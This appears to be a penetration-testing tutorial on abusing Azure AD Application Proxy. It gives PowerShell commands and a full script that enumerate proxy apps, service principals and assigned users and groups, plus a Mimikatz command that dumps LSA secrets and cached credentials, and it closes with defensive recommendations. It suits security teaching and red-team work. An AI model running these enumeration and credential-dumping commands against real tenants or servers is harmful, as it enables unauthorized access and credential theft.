# Application proxy abuse

**Azure AD Application Proxy** allows secure remote access to internal (on-premises) web applications via Azure AD authentication. If misconfigured, attackers can exploit it to pivot from the cloud into the internal network, enumerate users/groups, and extract secrets.

**Step 1: Enumerate Applications Behind Application Proxy**

Import-Module .\AzureAD.psd1

Get-AzureADApplication \| ForEach-Object {

try {

Get-AzureADApplicationProxyApplication -ObjectId \$\_.ObjectId

\$\_.DisplayName

\$\_.ObjectId

} catch {}

}

This lists applications configured with **Azure AD Application Proxy**, revealing their internal backends exposed via Azure.

**🧑‍🤝‍🧑 Step 2: Identify the Service Principal for the Target Application**

Get-AzureADServicePrincipal -All \$true \| Where-Object { \$\_.DisplayName -eq "\<APPLICATION NAME\>" }

This is useful for mapping roles, access assignments, and policies tied to the proxy app.

**🔐 Step 3: Enumerate Assigned Users and Groups**

Assuming you have a helper script (or build your own), run:

.\Get-ApplicationProxyAssignedUsersAndGroups.ps1

Get-ApplicationProxyAssignedUsersAndGroups -ObjectId \<SERVICE_PRINCIPAL_OBJECT_ID\>

This reveals users and groups granted access through the Azure Application Proxy to internal apps.

**📥 Step 4: Access the Application & Exploit**

Once you've identified and accessed the proxied application:

- Look for misconfigurations such as:

  - Lack of authentication on the internal backend

  - Hidden admin panels

  - Internal APIs accessible via the proxy

  - Known CVEs in web frameworks or login portals

Successful exploitation may lead to credential exposure or lateral movement to internal systems.

**🧪 Step 5: Extract Secrets with Mimikatz (Post-Exploitation on Compromised Server)**

If the attacker gains access to the backend server (e.g., via RCE):

Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'

This extracts sensitive data such as service account credentials, LSA secrets, and cached passwords from memory.

**🚨 Security Impact**

- May allow **unauthorized access** to **on-premises systems**.

- Can result in **domain escalation** or **Active Directory compromise**.

- **Weak or missing internal authentication** is a critical misconfiguration.

**✅ Recommendations (Defense):**

- Enforce **pre-authentication** for all proxy apps.

- Enable **conditional access policies**.

- Monitor access logs in **Microsoft Entra ID** (formerly Azure AD).

- Regularly test internal applications for vulnerabilities before exposing via proxy.

## Enumerate Azure AD Application Proxy Apps + Access Info

Here is a **PowerShell script** that **automates enumeration** of all Azure AD Application Proxy apps in a tenant, checks for their service principals, and lists assigned users/groups—ideal for an Azure penetration testing or red team engagement:

\# Requires AzureAD module: Install-Module AzureAD -Force

Import-Module AzureAD

\# Authenticate to Azure AD

Connect-AzureAD

\# Store results

\$proxyApps = @()

\# Step 1: Get all Azure AD Applications and check if App Proxy is configured

\$apps = Get-AzureADApplication

foreach (\$app in \$apps) {

try {

\$proxyApp = Get-AzureADApplicationProxyApplication -ObjectId \$app.ObjectId

if (\$proxyApp.ExternalUrl) {

\$proxyApps += \[PSCustomObject\]@{

DisplayName = \$app.DisplayName

InternalURL = \$proxyApp.InternalUrl

ExternalURL = \$proxyApp.ExternalUrl

AppObjectId = \$app.ObjectId

}

}

} catch {

\# Skip apps that aren't proxy-enabled

}

}

\# Step 2: Display found Application Proxy apps

Write-Host "\`n=== Application Proxy Apps Found ===\`n"

\$proxyApps \| Format-Table DisplayName, InternalURL, ExternalURL

\# Step 3: Get assigned users and groups per proxy app

foreach (\$proxyApp in \$proxyApps) {

Write-Host "\`n==== Access Info for: \$(\$proxyApp.DisplayName) ===="

\# Get Service Principal for the app

\$sp = Get-AzureADServicePrincipal -All \$true \| Where-Object { \$\_.AppId -eq (\$apps \| Where-Object { \$\_.ObjectId -eq \$proxyApp.AppObjectId }).AppId }

if (\$sp) {

\# List assigned users

\$users = Get-AzureADServiceAppRoleAssignment -ObjectId \$sp.ObjectId \| ForEach-Object {

Get-AzureADUser -ObjectId \$\_.PrincipalId

} \| Select DisplayName, UserPrincipalName

if (\$users) {

Write-Host "Assigned Users:"

\$users \| Format-Table DisplayName, UserPrincipalName

}

\# List assigned groups

\$groups = Get-AzureADServiceAppRoleAssignment -ObjectId \$sp.ObjectId \| ForEach-Object {

Get-AzureADGroup -ObjectId \$\_.PrincipalId -ErrorAction SilentlyContinue

} \| Select DisplayName, ObjectId

if (\$groups) {

Write-Host "Assigned Groups:"

\$groups \| Format-Table DisplayName, ObjectId

}

} else {

Write-Host "No service principal found for this app."

}

}

**🔎 What It Does:**

- Finds **all apps with Azure AD Application Proxy** enabled.

- Extracts **internal and external URLs**.

- Identifies associated **service principals**.

- Lists all **users and groups** granted access to each proxy app.
